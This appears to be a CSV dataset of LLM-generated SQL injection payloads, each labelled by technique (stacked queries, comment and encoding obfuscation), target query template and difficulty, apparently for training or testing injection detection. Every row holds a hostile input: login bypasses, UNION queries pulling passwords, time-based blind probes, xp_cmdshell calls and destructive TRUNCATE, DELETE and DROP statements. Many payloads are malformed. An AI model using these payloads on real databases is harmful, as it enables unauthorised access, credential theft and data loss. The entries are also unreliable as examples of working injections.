stacked_queries,user_lookup,"1); UPDATE users SET password = 'hacked' WHERE id = 1;""","SELECT * FROM users WHERE id = 1); UPDATE users SET password = 'hacked' WHERE id = 1;""",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
stacked_queries,user_lookup,"1'))/* Another Comment */; TRUNCATE TABLE users;"",]","SELECT * FROM users WHERE id = 1'))/* Another Comment */; TRUNCATE TABLE users;"",]",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
stacked_queries,order_filter,); INSERT INTO logs VALUES('attack'); --,SELECT * FROM orders WHERE status = '); INSERT INTO logs VALUES('attack'); --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
stacked_queries,order_filter,";--\""\""=\""\"" UNION ALL SELECT NULL,NULL,'dropped_table',NULL#""","SELECT * FROM orders WHERE status = ';--\""\""=\""\"" UNION ALL SELECT NULL,NULL,'dropped_table',NULL#""' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
stacked_queries,order_filter,";/**/ALTER TABLE users SET password='hacked'/**/""","SELECT * FROM orders WHERE status = ';/**/ALTER TABLE users SET password='hacked'/**/""' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
stacked_queries,order_filter,OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name='admin')--,SELECT * FROM orders WHERE status = 'OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name='admin')--' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
stacked_queries,order_filter,"; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_addextendedproperty @name=N'MS_Description', @value=N'This is a comment to mask the SQL command', @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'orders'; --","SELECT * FROM orders WHERE status = '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_addextendedproperty @name=N'MS_Description', @value=N'This is a comment to mask the SQL command', @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'orders'; --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
stacked_queries,order_filter,; WAITFOR DELAY '0:0:10'; UPDATE orders SET status = 'processed' WHERE user_id < 100 --,SELECT * FROM orders WHERE status = '; WAITFOR DELAY '0:0:10'; UPDATE orders SET status = 'processed' WHERE user_id < 100 --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
stacked_queries,order_filter,; DECLARE @cmd NVARCHAR(500); SET @cmd = N'DELETE FROM orders WHERE 1=1'; EXECUTE(@cmd) --,SELECT * FROM orders WHERE status = '; DECLARE @cmd NVARCHAR(500); SET @cmd = N'DELETE FROM orders WHERE 1=1'; EXECUTE(@cmd) --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
stacked_queries,comment_insert,"' UNION ALL SELECT 1, 1, 1, 1 #","INSERT INTO comments (user_id, body) VALUES (1, '' UNION ALL SELECT 1, 1, 1, 1 #')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
stacked_queries,comment_insert,; SELECT * FROM users WHERE '1'='1,"INSERT INTO comments (user_id, body) VALUES (1, '; SELECT * FROM users WHERE '1'='1')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
stacked_queries,comment_insert,' AND 1=1/*; DELETE FROM sessions;,"INSERT INTO comments (user_id, body) VALUES (1, '' AND 1=1/*; DELETE FROM sessions;')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
stacked_queries,comment_insert,--''; EXEC sp_droplogin 'sa'; --,"INSERT INTO comments (user_id, body) VALUES (1, '--''; EXEC sp_droplogin 'sa'; --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
stacked_queries,comment_insert,"--""; WAITFOR DELAY '0:0:5' AND (SELECT '%' = '%')","INSERT INTO comments (user_id, body) VALUES (1, '--""; WAITFOR DELAY '0:0:5' AND (SELECT '%' = '%')')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,login,--1' OR 1=1#,SELECT * FROM users WHERE username = '--1' OR 1=1#' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,login,1'/**/OR/**/?=1--,SELECT * FROM users WHERE username = '1'/**/OR/**/?=1--' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,login,1'/*1=1,SELECT * FROM users WHERE username = '1'/*1=1' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,login,/**/SELECT/**/NULL/**/FROM/**/users/**/WHERE/**/username/**/=/**/'--'/**/AND/**/password/**/=/**/'anything',SELECT * FROM users WHERE username = '/**/SELECT/**/NULL/**/FROM/**/users/**/WHERE/**/username/**/=/**/'--'/**/AND/**/password/**/=/**/'anything'' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,login,1'/**/OR/**/CASE/**/WHEN/**/3%3D3/**/THEN/**/1/**/ELSE/**/0/**/END/**/=/**/1/**/#,SELECT * FROM users WHERE username = '1'/**/OR/**/CASE/**/WHEN/**/3%3D3/**/THEN/**/1/**/ELSE/**/0/**/END/**/=/**/1/**/#' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,login,"--1'/**/UNION/**/ALL/**/SELECT/**/NULL/**/,/**/NULL/**/,/**/NULL/**/#","SELECT * FROM users WHERE username = '--1'/**/UNION/**/ALL/**/SELECT/**/NULL/**/,/**/NULL/**/,/**/NULL/**/#' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,login,1'/**/LIKE/**/'-1'/**/-/**/%'/**//**/AND/**/password/**/=/**/'anything'/**/--,SELECT * FROM users WHERE username = '1'/**/LIKE/**/'-1'/**/-/**/%'/**//**/AND/**/password/**/=/**/'anything'/**/--' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,login,"-1'/**/UNION/**/SELECT/**/1,/**/2,/**/SUBSTR(CAST(SLEEP(5)/**/AS/**/VARCHAR),/**/1,/**/1)/**/LIMIT/**/1/**/#","SELECT * FROM users WHERE username = '-1'/**/UNION/**/SELECT/**/1,/**/2,/**/SUBSTR(CAST(SLEEP(5)/**/AS/**/VARCHAR),/**/1,/**/1)/**/LIMIT/**/1/**/#' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,login,'/*'*/ OR 1=1#,SELECT * FROM users WHERE username = ''/*'*/ OR 1=1#' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,login,--'/**/ OR CHAR(65)-32 IN ('A')#,SELECT * FROM users WHERE username = '--'/**/ OR CHAR(65)-32 IN ('A')#' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,login,' AND /* */(SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END)#,SELECT * FROM users WHERE username = '' AND /* */(SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END)#' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,search,1'/*'*/and/**/(select/**/count(*)/**/from/**/information_schema.tables),SELECT * FROM products WHERE name LIKE '%1'/*'*/and/**/(select/**/count(*)/**/from/**/information_schema.tables)%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,search,1'#',SELECT * FROM products WHERE name LIKE '%1'#'%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,search,;/**/insert/**/into/**/products(name)/**/values('Exploit')--,SELECT * FROM products WHERE name LIKE '%;/**/insert/**/into/**/products(name)/**/values('Exploit')--%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,search,"'1'/**/or/**/ASCII(SUBSTRING(username,1,1))<110--","SELECT * FROM products WHERE name LIKE '%'1'/**/or/**/ASCII(SUBSTRING(username,1,1))<110--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,search,1'/*!*/ OR 1= (SELECT /*! COUNT(*/ * /*!) FROM INFORMATION_SCHEMA.TABLES),SELECT * FROM products WHERE name LIKE '%1'/*!*/ OR 1= (SELECT /*! COUNT(*/ * /*!) FROM INFORMATION_SCHEMA.TABLES)%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,search,1'--# OR 1= (/**/SELECT/**/CONCAT(CAST(LENGTH((SELECT /**/ user())) AS CHAR)))#,SELECT * FROM products WHERE name LIKE '%1'--# OR 1= (/**/SELECT/**/CONCAT(CAST(LENGTH((SELECT /**/ user())) AS CHAR)))#%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,search,1'%20OR%201= (%00SELECT%00%20CASE%20WHEN%20(SELECT%20%20%201%20FROM%20dual)%20THEN%20%27a%27%20ELSE%20%27b%27%20END),SELECT * FROM products WHERE name LIKE '%1'%20OR%201= (%00SELECT%00%20CASE%20WHEN%20(SELECT%20%20%201%20FROM%20dual)%20THEN%20%27a%27%20ELSE%20%27b%27%20END)%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,search,"1'/**/%0A UNION ALL SELECT NULL--, NULL --","SELECT * FROM products WHERE name LIKE '%1'/**/%0A UNION ALL SELECT NULL--, NULL --%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,search,"1' OR 1= (SELECT UPPER(CONCAT(CHAR(67),CHAR(67),CHAR(69))))--","SELECT * FROM products WHERE name LIKE '%1' OR 1= (SELECT UPPER(CONCAT(CHAR(67),CHAR(67),CHAR(69))))--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,search,/**/1'/**/ AND/**/ (SELECT/**/ COUNT(*)/**/ FROM/**/ users)/**/ --,SELECT * FROM products WHERE name LIKE '%/**/1'/**/ AND/**/ (SELECT/**/ COUNT(*)/**/ FROM/**/ users)/**/ --%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,search,"--1'/**/ OR/**/ ASCII(SUBSTRING(password,1,1)) < 115","SELECT * FROM products WHERE name LIKE '%--1'/**/ OR/**/ ASCII(SUBSTRING(password,1,1)) < 115%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,search,#1'/**/ WAITFOR DELAY '0:0:10'/**/ AND/**/ '%' = '%',SELECT * FROM products WHERE name LIKE '%#1'/**/ WAITFOR DELAY '0:0:10'/**/ AND/**/ '%' = '%'%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,user_lookup,"#/**/1' UNION SELECT username, password FROM admins#","SELECT * FROM users WHERE id = #/**/1' UNION SELECT username, password FROM admins#",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,user_lookup,' OR EXISTS(SELECT * FROM users WHERE username = 'admin' AND password LIKE '#%'--,SELECT * FROM users WHERE id = ' OR EXISTS(SELECT * FROM users WHERE username = 'admin' AND password LIKE '#%'--,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,user_lookup,"-3999""') OR '1'='1'--+","SELECT * FROM users WHERE id = -3999""') OR '1'='1'--+",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,user_lookup,' OR 'x'='x'/*'a'='a,SELECT * FROM users WHERE id = ' OR 'x'='x'/*'a'='a,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,user_lookup,/**/1' /*comment*/ OR EXISTS(SELECT * FROM users /*comment*/ WHERE id = 'admin' AND password LIKE '#%%',SELECT * FROM users WHERE id = /**/1' /*comment*/ OR EXISTS(SELECT * FROM users /*comment*/ WHERE id = 'admin' AND password LIKE '#%%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,user_lookup,"--1' UNION ALL SELECT username, password FROM users --","SELECT * FROM users WHERE id = --1' UNION ALL SELECT username, password FROM users --",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,user_lookup,"#1' OR CAST(CHAR(48, 49, 50, 48, 49, 48, 48, 48, 48, 48, 48, 48, 48, 48) AS INT) > 0 --","SELECT * FROM users WHERE id = #1' OR CAST(CHAR(48, 49, 50, 48, 49, 48, 48, 48, 48, 48, 48, 48, 48, 48) AS INT) > 0 --",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,user_lookup,-1' OR (SELECT 1 FROM (SELECT COUNT(*) FROM information_schema.tables WHERE table_type = 'BASE TABLE')) = 1--,SELECT * FROM users WHERE id = -1' OR (SELECT 1 FROM (SELECT COUNT(*) FROM information_schema.tables WHERE table_type = 'BASE TABLE')) = 1--,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,user_lookup,//1' OR 1=1/#,SELECT * FROM users WHERE id = //1' OR 1=1/#,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,user_lookup,"/**/1' UNION SELECT username, password FROM users/**/","SELECT * FROM users WHERE id = /**/1' UNION SELECT username, password FROM users/**/",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,user_lookup,--1' OR (SELECT MAX(id) FROM users) > 1--,SELECT * FROM users WHERE id = --1' OR (SELECT MAX(id) FROM users) > 1--,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,user_lookup,#1' OR (SELECT 1 FROM system_tables) = 1#,SELECT * FROM users WHERE id = #1' OR (SELECT 1 FROM system_tables) = 1#,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,order_filter,/**/ OR /**/'1'='1,SELECT * FROM orders WHERE status = '/**/ OR /**/'1'='1' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,order_filter,1'; /* --,SELECT * FROM orders WHERE status = '1'; /* --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,order_filter,-- OR '1'='1,SELECT * FROM orders WHERE status = '-- OR '1'='1' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,order_filter,# OR 'a'='a'/*,SELECT * FROM orders WHERE status = '# OR 'a'='a'/*' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,order_filter,/* OR */'b'='b',SELECT * FROM orders WHERE status = '/* OR */'b'='b'' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,comment_insert,--%23 AND (SELECT 1 FROM users WHERE username = 'admin') --,"INSERT INTO comments (user_id, body) VALUES (1, '--%23 AND (SELECT 1 FROM users WHERE username = 'admin') --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,comment_insert,/*-- AND 'x'='x',"INSERT INTO comments (user_id, body) VALUES (1, '/*-- AND 'x'='x'')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,comment_insert,"[""/**/ 3580  =  (select count(*) from domain.domains as t1, domain.columns as t2, domain.tables as t3)"", ""-- ' OR 1=1 --"", ""# ; DROP TABLE IF EXISTS comments;#"", ""/*"") */ SELECT 1 FROM users WHERE username = 'admin'"", ""1%' OR 1=1 AND '%' = '""]","INSERT INTO comments (user_id, body) VALUES (1, '[""/**/ 3580  =  (select count(*) from domain.domains as t1, domain.columns as t2, domain.tables as t3)"", ""-- ' OR 1=1 --"", ""# ; DROP TABLE IF EXISTS comments;#"", ""/*"") */ SELECT 1 FROM users WHERE username = 'admin'"", ""1%' OR 1=1 AND '%' = '""]')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,comment_insert,/*# AND 1=(SELECT 1 FROM information_schema.tables WHERE table_name = 'users'),"INSERT INTO comments (user_id, body) VALUES (1, '/*# AND 1=(SELECT 1 FROM information_schema.tables WHERE table_name = 'users')')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,comment_insert,#; WAITFOR DELAY '0:0:5' AND (1=1)),"INSERT INTO comments (user_id, body) VALUES (1, '#; WAITFOR DELAY '0:0:5' AND (1=1))')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,comment_insert,--%23 AND (SELECT 1 FROM users WHERE username LIKE '%admin'),"INSERT INTO comments (user_id, body) VALUES (1, '--%23 AND (SELECT 1 FROM users WHERE username LIKE '%admin')')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,login,"1' AND (SELECT IF(SUBSTRING((SELECT USER()),1,1)='root',1,0))#","SELECT * FROM users WHERE username = '1' AND (SELECT IF(SUBSTRING((SELECT USER()),1,1)='root',1,0))#' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
encoding_obfuscation,login,1' OR EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.USERS WHERE PASSWORD=''),SELECT * FROM users WHERE username = '1' OR EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.USERS WHERE PASSWORD='')' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
encoding_obfuscation,login,%27+UNION+SELECT+NULL+FROM+(SELECT+CASE+WHEN+%28SELECT+SLEEP%285%29%29%3D%28SELECT+SLEEP%285%29%29+THEN+1+ELSE+0+END+AS+x+FROM+dual)%2B'%27--+,SELECT * FROM users WHERE username = '%27+UNION+SELECT+NULL+FROM+(SELECT+CASE+WHEN+%28SELECT+SLEEP%285%29%29%3D%28SELECT+SLEEP%285%29%29+THEN+1+ELSE+0+END+AS+x+FROM+dual)%2B'%27--+' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
encoding_obfuscation,login,"%27 UNION ALL SELECT NULL, NULL, NULL FROM (SELECT 1 FROM users WHERE username LIKE '%'""","SELECT * FROM users WHERE username = '%27 UNION ALL SELECT NULL, NULL, NULL FROM (SELECT 1 FROM users WHERE username LIKE '%'""' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,login,"OR '1'='1' --""","SELECT * FROM users WHERE username = 'OR '1'='1' --""' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,login,CHAR(39) || ' OR ' || CHAR(39) || '1' || CHAR(39) || '=' || CHAR(39) || '1' || CHAR(39),SELECT * FROM users WHERE username = 'CHAR(39) || ' OR ' || CHAR(39) || '1' || CHAR(39) || '=' || CHAR(39) || '1' || CHAR(39)' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,login,"CHAR(34) || CHAR(37) || CHAR(42) || CHAR(34) || "" OR 'x'='x""","SELECT * FROM users WHERE username = 'CHAR(34) || CHAR(37) || CHAR(42) || CHAR(34) || "" OR 'x'='x""' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,login,OR (SELECT 1 FROM users WHERE username = 'admin') #,SELECT * FROM users WHERE username = 'OR (SELECT 1 FROM users WHERE username = 'admin') #' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,search,%' OR 'a'='a',SELECT * FROM products WHERE name LIKE '%%' OR 'a'='a'%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
encoding_obfuscation,search,"%' UNION ALL SELECT NULL, NULL, NULL, NULL#","SELECT * FROM products WHERE name LIKE '%%' UNION ALL SELECT NULL, NULL, NULL, NULL#%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
encoding_obfuscation,search,%'xp_cmdshell('dir')--,SELECT * FROM products WHERE name LIKE '%%'xp_cmdshell('dir')--%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
encoding_obfuscation,search,"[""%\' ANDCHAR(65) = CHAR(65)--""","SELECT * FROM products WHERE name LIKE '%[""%\' ANDCHAR(65) = CHAR(65)--""%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
encoding_obfuscation,search,"%\'UNION ALLSELECTCHAR(73),CHAR(83),CHAR(75),NULL#""","SELECT * FROM products WHERE name LIKE '%%\'UNION ALLSELECTCHAR(73),CHAR(83),CHAR(75),NULL#""%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
encoding_obfuscation,search,"%\'--%\'OR \'1\'=\'1\""""","SELECT * FROM products WHERE name LIKE '%%\'--%\'OR \'1\'=\'1\""""%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
encoding_obfuscation,search,"%\'WAITFOR DELAY \'0:0:10\'AND \'a\'=\'a\""""","SELECT * FROM products WHERE name LIKE '%%\'WAITFOR DELAY \'0:0:10\'AND \'a\'=\'a\""""%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
encoding_obfuscation,search,"%\'/*%\'+CHAR(80)+CHAR(72)%\'+*/--""]","SELECT * FROM products WHERE name LIKE '%%\'/*%\'+CHAR(80)+CHAR(72)%\'+*/--""]%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
encoding_obfuscation,search,% OR (CAST(HEX(ASCII((SELECT USER()))) AS CHAR) = '68656c6c6f20776f726c64'),SELECT * FROM products WHERE name LIKE '%% OR (CAST(HEX(ASCII((SELECT USER()))) AS CHAR) = '68656c6c6f20776f726c64')%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,search,"% AND (CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username = 'admin'), 1, 1) = 'h') THEN 1 ELSE 0 END) --","SELECT * FROM products WHERE name LIKE '%% AND (CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username = 'admin'), 1, 1) = 'h') THEN 1 ELSE 0 END) --%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,user_lookup,%22-1%22; WAITFOR DELAY+'0:0:5'+--,SELECT * FROM users WHERE id = %22-1%22; WAITFOR DELAY+'0:0:5'+--,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
encoding_obfuscation,user_lookup,-9223372036854775807%22+WAITFOR+DELAY+'0:0:5'+--,SELECT * FROM users WHERE id = -9223372036854775807%22+WAITFOR+DELAY+'0:0:5'+--,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
encoding_obfuscation,user_lookup,' AND 1=1 OR CAST('a' AS CHAR(1))='b',SELECT * FROM users WHERE id = ' AND 1=1 OR CAST('a' AS CHAR(1))='b',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
encoding_obfuscation,user_lookup,"%22UNION+SELECT+'admin',NULL,NULL,NULL--","SELECT * FROM users WHERE id = %22UNION+SELECT+'admin',NULL,NULL,NULL--",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
encoding_obfuscation,user_lookup,/*comment*/1'/**/or/**/CAST('0'/**/AS/**/CHAR(1))='1--,SELECT * FROM users WHERE id = /*comment*/1'/**/or/**/CAST('0'/**/AS/**/CHAR(1))='1--,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,user_lookup,"0x31'%20AND%20SUBSTR(password,1,1)%3D'0'--","SELECT * FROM users WHERE id = 0x31'%20AND%20SUBSTR(password,1,1)%3D'0'--",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,order_filter,";WAITFOR DELAY '0:0:10'--""","SELECT * FROM orders WHERE status = ';WAITFOR DELAY '0:0:10'--""' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
encoding_obfuscation,order_filter,"OR+'a'='a'+UNION+SELECT+password+FROM+admin--""","SELECT * FROM orders WHERE status = 'OR+'a'='a'+UNION+SELECT+password+FROM+admin--""' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
encoding_obfuscation,order_filter,%27%20OR%20CHAR(80)%3D'P'/*,SELECT * FROM orders WHERE status = '%27%20OR%20CHAR(80)%3D'P'/*' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
encoding_obfuscation,order_filter,"%27)%20UNION%20ALL%20SELECT%20CONCAT(username,%20'%20',%20password)%20FROM%20admin--","SELECT * FROM orders WHERE status = '%27)%20UNION%20ALL%20SELECT%20CONCAT(username,%20'%20',%20password)%20FROM%20admin--' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
encoding_obfuscation,order_filter,/*--%20UNION%2bSELECT%2bdatabase()%2c%2bschema()%2c%2btable_name()%2c%2bcolumn_name()%2bFROM%2binformation_schema.*%2bWHERE%2btable_type%2b=%2b'TABLE'*/,SELECT * FROM orders WHERE status = '/*--%20UNION%2bSELECT%2bdatabase()%2c%2bschema()%2c%2btable_name()%2c%2bcolumn_name()%2bFROM%2binformation_schema.*%2bWHERE%2btable_type%2b=%2b'TABLE'*/' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,comment_insert,"--%3E%0D%0A1'%20and%20(SELECT%20DBMS_PIPE.RECEIVE_MESSAGE(%20CHR(66)%20||CHR(67)%20||CHR(79)%20||CHR(101),5))--","INSERT INTO comments (user_id, body) VALUES (1, '--%3E%0D%0A1'%20and%20(SELECT%20DBMS_PIPE.RECEIVE_MESSAGE(%20CHR(66)%20||CHR(67)%20||CHR(79)%20||CHR(101),5))--')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
encoding_obfuscation,comment_insert,"<!--1';%20INSERT%20INTO%20dual%20(SELECT%20CHR((ASCII(substring(current_user,1,1))+1))),NULL--","INSERT INTO comments (user_id, body) VALUES (1, '<!--1';%20INSERT%20INTO%20dual%20(SELECT%20CHR((ASCII(substring(current_user,1,1))+1))),NULL--')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
encoding_obfuscation,comment_insert,%0D%0A1'%20OR%20CAST(NULL%20AS%20VARCHAR2)%20=%20DBMS_UTILITY.SQLID_TO_SQLHASH(CAST('bcpjqq2%20select%20(case%20when%20(4747=4747)%20then%201%20else%200%20end)%20from%20dual%20qqzvxq' AS VARCHAR2))%20--,"INSERT INTO comments (user_id, body) VALUES (1, '%0D%0A1'%20OR%20CAST(NULL%20AS%20VARCHAR2)%20=%20DBMS_UTILITY.SQLID_TO_SQLHASH(CAST('bcpjqq2%20select%20(case%20when%20(4747=4747)%20then%201%20else%200%20end)%20from%20dual%20qqzvxq' AS VARCHAR2))%20--')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
encoding_obfuscation,comment_insert,"%0D%0A1';%20WAITFOR%20DELAY%20'0:0:5'%20AND%20(select%20case%20when%20(1=1)%20then%20sys.fn_varbintohexstr(hashbytes('md5',current_timestamp))%20else%20null%20end)%20--","INSERT INTO comments (user_id, body) VALUES (1, '%0D%0A1';%20WAITFOR%20DELAY%20'0:0:5'%20AND%20(select%20case%20when%20(1=1)%20then%20sys.fn_varbintohexstr(hashbytes('md5',current_timestamp))%20else%20null%20end)%20--')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
encoding_obfuscation,comment_insert,%20or%20(select%20count(*)%20from%20users%20where%20username='admin'))--,"INSERT INTO comments (user_id, body) VALUES (1, '%20or%20(select%20count(*)%20from%20users%20where%20username='admin'))--')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
encoding_obfuscation,comment_insert,%20waitfor%20delay%20'0:0:10'%20and%20exists(select%20*%20from%20products%20where%20product_name='Injection'),"INSERT INTO comments (user_id, body) VALUES (1, '%20waitfor%20delay%20'0:0:10'%20and%20exists(select%20*%20from%20products%20where%20product_name='Injection')')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
